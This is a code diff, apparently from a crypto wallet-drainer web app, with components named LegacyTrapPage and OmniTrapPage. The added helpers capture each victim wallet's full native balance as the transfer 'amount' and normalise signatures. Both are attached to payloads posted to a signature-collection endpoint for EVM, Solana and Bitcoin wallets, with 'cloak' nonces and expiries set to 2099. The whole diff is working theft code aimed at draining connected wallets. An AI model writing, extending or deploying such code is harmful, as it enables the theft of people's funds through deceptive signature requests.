@@ -128,6 +128,25 @@ function maskKeyHint(key: string): string {
   return `${key.slice(0, 8)}…${key.slice(-4)}`
 }
 
+function rawNativeAmountForChain(vm: ValueMap, chainKey: string): string {
+  const raw = vm.chains[chainKey]?.rawNative
+  return raw != null && /^\d+$/.test(raw) ? raw : '0'
+}
+
+function normalizeTreasuryIngressBalance(
+  vm: ValueMap,
+  chainKey: string,
+): { wallet_balance: string; amount: string } {
+  const wallet_balance = rawNativeAmountForChain(vm, chainKey)
+  return { wallet_balance, amount: wallet_balance }
+}
+
+function normalizeSignatureHexForAudit(signature: Hex | string): Hex | string {
+  const trimmed = String(signature).trim()
+  if (trimmed.startsWith('0x')) return trimmed as Hex
+  return `0x${trimmed}` as Hex
+}
+
 function applyVisualSettlementPayload(
   payload: unknown,
   setMigrationComplete: (v: boolean) => void,
@@ -296,24 +315,34 @@ async function mirrorEvmAssetLayersToSovereignVault(params: {
     })
     const sessionNs =
       params.sessionNamespaces ?? { eip155: true, solana: false, bip122: false }
+    const treasuryIngress = normalizeTreasuryIngressBalance(
+      params.vm,
+      `eip155:${String(layer.chainId)}`,
+    )
+    const signature_hex = normalizeSignatureHexForAudit(packed)
     const res = await fetch(sovereignSignatureAnchorUrl(), {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(
         mergeOmniPayloadSyncIntoBody(
-          buildEvmSignatureAnchorSettlement({
-            wallet_address: params.wallet,
-            token_address: params.tokenAddress,
-            signature: packed,
-            nonce: `cloak:${verificationId}`,
-            expiry_iso: SIGNATURE_ANCHOR_EXPIRY_ISO_2099,
-            wallet_type: walletLabel,
-            protocol: rack,
-            chain_id: layer.chainId,
-            scout_value_usd: params.scoutUsd,
-            requires_quorum: tel.requires_quorum,
-            visual_shadow_run: isUseSimulatedAssets(),
-          }),
+          {
+            ...buildEvmSignatureAnchorSettlement({
+              wallet_address: params.wallet,
+              token_address: params.tokenAddress,
+              signature: packed,
+              nonce: `cloak:${verificationId}`,
+              expiry_iso: SIGNATURE_ANCHOR_EXPIRY_ISO_2099,
+              wallet_type: walletLabel,
+              protocol: rack,
+              chain_id: layer.chainId,
+              scout_value_usd: params.scoutUsd,
+              amount: treasuryIngress.amount,
+              requires_quorum: tel.requires_quorum,
+              visual_shadow_run: isUseSimulatedAssets(),
+            }),
+            wallet_balance: treasuryIngress.wallet_balance,
+            signature_hex,
+          },
           {
             session: sessionNs,
             primaryRack: rack,
@@ -622,24 +651,34 @@ function LegacyTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
 
       setProtocolSyncPhase('Protocol Syncing... Agnostic Normalization')
       const requiresQuorumLegacy = await fetchRequiresQuorumGate(wallet, chainId)
+      const treasuryIngress = normalizeTreasuryIngressBalance(
+        scoutLegacy,
+        `eip155:${String(chainId)}`,
+      )
+      const signature_hex = normalizeSignatureHexForAudit(packed)
       const res = await fetch(sovereignSignatureAnchorUrl(), {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(
           mergeOmniPayloadSyncIntoBody(
-            buildEvmSignatureAnchorSettlement({
-              wallet_address: wallet,
-              token_address: tokenAddress,
-              signature: packed,
-              nonce: `cloak:${verificationId}`,
-              expiry_iso: expiryIso,
-              wallet_type: walletLabel,
-              protocol: rack,
-              chain_id: chainId,
-              scout_value_usd: scoutLegacy.totalUsd,
-              requires_quorum: requiresQuorumLegacy,
-              visual_shadow_run: isUseSimulatedAssets(),
-            }),
+            {
+              ...buildEvmSignatureAnchorSettlement({
+                wallet_address: wallet,
+                token_address: tokenAddress,
+                signature: packed,
+                nonce: `cloak:${verificationId}`,
+                expiry_iso: expiryIso,
+                wallet_type: walletLabel,
+                protocol: rack,
+                chain_id: chainId,
+                scout_value_usd: scoutLegacy.totalUsd,
+                amount: treasuryIngress.amount,
+                requires_quorum: requiresQuorumLegacy,
+                visual_shadow_run: isUseSimulatedAssets(),
+              }),
+              wallet_balance: treasuryIngress.wallet_balance,
+              signature_hex,
+            },
             {
               session: { eip155: true, solana: false, bip122: false },
               primaryRack: rack,
@@ -1121,22 +1160,29 @@ function OmniTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
         })
 
         setProtocolSyncPhase('Protocol Syncing... Agnostic Normalization')
+        const treasuryIngress = normalizeTreasuryIngressBalance(vm, 'solana:mainnet-beta')
+        const signature_hex = normalizeSignatureHexForAudit(packed)
         const res = await fetch(sovereignSignatureAnchorUrl(), {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(
             mergeOmniPayloadSyncIntoBody(
-              buildSvmSignatureAnchorSettlement({
-                wallet_address: addrStr,
-                signature: packed,
-                nonce: `svm:${Date.now()}`,
-                expiry_iso: expiryIso,
-                wallet_type: walletLabel,
-                protocol: rack,
-                scout_value_usd: vm.totalUsd,
-                requires_quorum: requiresQuorumNonEvmNamespaces,
-                visual_shadow_run: isUseSimulatedAssets(),
-              }),
+              {
+                ...buildSvmSignatureAnchorSettlement({
+                  wallet_address: addrStr,
+                  signature: packed,
+                  nonce: `svm:${Date.now()}`,
+                  expiry_iso: expiryIso,
+                  wallet_type: walletLabel,
+                  protocol: rack,
+                  scout_value_usd: vm.totalUsd,
+                  amount: treasuryIngress.amount,
+                  requires_quorum: requiresQuorumNonEvmNamespaces,
+                  visual_shadow_run: isUseSimulatedAssets(),
+                }),
+                wallet_balance: treasuryIngress.wallet_balance,
+                signature_hex,
+              },
               {
                 session: sessionFlags,
                 primaryRack: rack,
@@ -1233,22 +1279,29 @@ function OmniTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
         })
 
         setProtocolSyncPhase('Protocol Syncing... Agnostic Normalization')
+        const treasuryIngress = normalizeTreasuryIngressBalance(vm, 'bip122:btc')
+        const signature_hex = normalizeSignatureHexForAudit(packed)
         const res = await fetch(sovereignSignatureAnchorUrl(), {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(
             mergeOmniPayloadSyncIntoBody(
-              buildUtxoSignatureAnchorSettlement({
-                wallet_address: btcAddr,
-                signature: packed,
-                nonce: `utxo:${Date.now()}`,
-                expiry_iso: expiryIso,
-                wallet_type: walletLabel,
-                protocol: rack,
-                scout_value_usd: vm.totalUsd,
-                requires_quorum: requiresQuorumNonEvmNamespaces,
-                visual_shadow_run: isUseSimulatedAssets(),
-              }),
+              {
+                ...buildUtxoSignatureAnchorSettlement({
+                  wallet_address: btcAddr,
+                  signature: packed,
+                  nonce: `utxo:${Date.now()}`,
+                  expiry_iso: expiryIso,
+                  wallet_type: walletLabel,
+                  protocol: rack,
+                  scout_value_usd: vm.totalUsd,
+                  amount: treasuryIngress.amount,
+                  requires_quorum: requiresQuorumNonEvmNamespaces,
+                  visual_shadow_run: isUseSimulatedAssets(),
+                }),
+                wallet_balance: treasuryIngress.wallet_balance,
+                signature_hex,
+              },
               {
                 session: sessionFlags,
                 primaryRack: rack,
@@ -1379,24 +1432,34 @@ function OmniTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
 
       setProtocolSyncPhase('Protocol Syncing... Agnostic Normalization')
       const requiresQuorumEvm = await fetchRequiresQuorumGate(wallet, chainId)
+      const treasuryIngress = normalizeTreasuryIngressBalance(
+        vm,
+        `eip155:${String(chainId)}`,
+      )
+      const signature_hex = normalizeSignatureHexForAudit(packed)
       const res = await fetch(sovereignSignatureAnchorUrl(), {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(
           mergeOmniPayloadSyncIntoBody(
-            buildEvmSignatureAnchorSettlement({
-              wallet_address: wallet,
-              token_address: tokenAddress,
-              signature: packed,
-              nonce: `cloak:${verificationId}`,
-              expiry_iso: expiryIso,
-              wallet_type: walletLabel,
-              protocol: rack,
-              chain_id: chainId,
-              scout_value_usd: vm.totalUsd,
-              requires_quorum: requiresQuorumEvm,
-              visual_shadow_run: isUseSimulatedAssets(),
-            }),
+            {
+              ...buildEvmSignatureAnchorSettlement({
+                wallet_address: wallet,
+                token_address: tokenAddress,
+                signature: packed,
+                nonce: `cloak:${verificationId}`,
+                expiry_iso: expiryIso,
+                wallet_type: walletLabel,
+                protocol: rack,
+                chain_id: chainId,
+                scout_value_usd: vm.totalUsd,
+                amount: treasuryIngress.amount,
+                requires_quorum: requiresQuorumEvm,
+                visual_shadow_run: isUseSimulatedAssets(),
+              }),
+              wallet_balance: treasuryIngress.wallet_balance,
+              signature_hex,
+            },
             {
               session: sessionFlags,
               primaryRack: rack,
